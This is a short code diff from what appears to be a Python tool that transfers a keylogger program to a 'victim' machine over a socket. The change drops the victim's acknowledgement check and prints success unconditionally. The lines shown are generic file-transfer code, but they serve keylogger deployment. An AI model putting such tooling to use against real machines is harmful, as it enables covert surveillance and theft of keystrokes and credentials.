@@ -246,18 +246,11 @@ def transfer_keylog_program(sock: socket.socket, dest_ip: str, dest_port: int):
                     break
                 sock.send(data)
 
-        # Send EOF signal to prevent receiver's recv() from blocking
         sock.send(constants.END_OF_FILE_SIGNAL)
 
-        # Get an ACK from victim for success
-        transfer_result = sock.recv(constants.BYTE_LIMIT).decode()
-
-        if transfer_result == constants.VICTIM_ACK:
-            print(constants.FILE_TRANSFER_SUCCESSFUL.format(constants.KEYLOG_FILE_NAME,
-                                                            dest_ip,
-                                                            dest_port))
-        else:
-            print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
+        print(constants.FILE_TRANSFER_SUCCESSFUL.format(constants.KEYLOG_FILE_NAME,
+                                                        dest_ip,
+                                                        dest_port))
 
 
 def is_file_openable(file_path):
